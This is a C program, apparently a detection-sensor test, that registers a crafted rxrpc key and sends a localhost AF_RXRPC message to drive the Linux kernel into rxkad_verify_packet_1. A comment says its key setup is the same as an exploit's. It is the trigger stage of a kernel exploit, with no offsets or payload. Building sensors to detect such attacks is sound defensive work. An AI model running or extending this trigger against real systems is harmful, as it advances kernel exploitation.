// rxrpc_trigger.c — reaches rxkad_verify_packet_1 without needing working offsets
// Compile: gcc -O0 -o rxrpc_trigger rxrpc_trigger.c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>
#include <arpa/inet.h>
#include <sys/syscall.h>

int main(void) {
    // 1. Register an rxrpc key (same as exploit)
    char payload[64] = {0};
    payload[7] = 4;
    memcpy(payload + 8, "evil\0", 5);
    payload[16] = 1; payload[19] = 44; payload[23] = 2; payload[31] = 1;
    long kid = syscall(SYS_add_key, "rxrpc", "sensor_test",
                       payload, 64, KEY_SPEC_PROCESS_KEYRING);
    if (kid < 0) { perror("add_key"); return 1; }
    printf("[+] rxrpc key id=%ld\n", kid);

    // 2. Fake UDP server (the "peer" rxrpc will handshake with)
    int udp = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in srv = {
        .sin_family = AF_INET,
        .sin_port   = htons(7779),
        .sin_addr.s_addr = inet_addr("127.0.0.1")
    };
    bind(udp, (struct sockaddr *)&srv, sizeof(srv));

    // 3. AF_RXRPC client socket
    int rpc = socket(AF_RXRPC, SOCK_DGRAM, AF_INET);
    setsockopt(rpc, SOL_RXRPC, RXRPC_SECURITY_KEY, "sensor_test", 11);
    int lvl = 1;
    setsockopt(rpc, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, &lvl, sizeof(lvl));

    struct sockaddr_rxrpc cli = {
        .srx_family        = AF_RXRPC,
        .srx_service       = 0,
        .transport_type    = SOCK_DGRAM,
        .transport_len     = sizeof(struct sockaddr_in),
        .transport.sin     = {AF_INET, htons(7780), {inet_addr("127.0.0.1")}}
    };
    bind(rpc, (struct sockaddr *)&cli, sizeof(cli));

    // 4. Send — this drives the RxRPC/rxkad handshake → rxkad_verify_packet_1
    struct sockaddr_rxrpc dst = cli;
    dst.srx_service    = 0x4d2;
    dst.transport.sin.sin_port = htons(7779);

    unsigned long call_id = 0xDEAD;
    struct iovec  iov  = { "PING", 4 };
    char          cmsg_buf[CMSG_SPACE(sizeof(call_id))];
    struct msghdr msg  = {
        .msg_name    = &dst, .msg_namelen = sizeof(dst),
        .msg_iov     = &iov, .msg_iovlen  = 1,
        .msg_control = cmsg_buf, .msg_controllen = sizeof(cmsg_buf)
    };
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_RXRPC;
    cm->cmsg_type  = RXRPC_USER_CALL_ID;
    cm->cmsg_len   = CMSG_LEN(sizeof(call_id));
    memcpy(CMSG_DATA(cm), &call_id, sizeof(call_id));

    sendmsg(rpc, &msg, 0);
    printf("[+] sendmsg sent — rxkad_verify_packet_1 should have been reached\n");

    // 5. Give the kernel a moment to process the handshake
    sleep(1);
    printf("[+] done — check your sensor output\n");
    return 0;
}
